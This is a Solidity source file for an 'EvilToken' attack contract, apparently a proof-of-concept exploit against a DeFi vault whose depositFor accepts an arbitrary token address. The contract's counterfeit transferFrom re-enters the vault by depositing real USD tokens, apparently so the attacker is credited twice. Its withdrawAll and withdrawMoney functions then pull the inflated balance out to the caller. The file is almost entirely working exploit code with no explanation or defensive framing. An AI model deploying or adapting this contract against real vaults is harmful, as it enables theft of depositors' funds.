pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";

interface IVault {
    function want() external view returns (IERC20);

    function beforeDeposit() external;

    function deposit(uint256 _amount) external;

    function withdraw(uint256 amount) external;

    function balanceOf(address traget) external view returns (uint256);

    function withdrawAll() external;

    /// @dev deposit funds into the system for other user
    function depositFor(address token, uint256 _amount, address user) external;
}

interface IEvil {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IUsd {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address reciever, uint256 amount) external returns (bool);
    function balanceOf(address _addr) external view returns (uint256) ;
}

contract EvilToken is IEvil {
    IVault vault;
    IUsd token;
    uint counter = 0;
    constructor(address _vault, address _usd) {
        vault = IVault(_vault);
        token = IUsd(_usd);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external override returns (bool) {
        token.approve(address(vault), 50000 ether);
        vault.deposit(10000 ether);
    }

    function getShares() external view returns (uint256) {
        return vault.balanceOf(address(this));
    }

    function withdrawAll() external {
        vault.withdrawAll();
    }

    function withdrawMoney() external {
        uint256 balance = token.balanceOf(address(this));
        token.transfer(msg.sender,balance);
    }
}
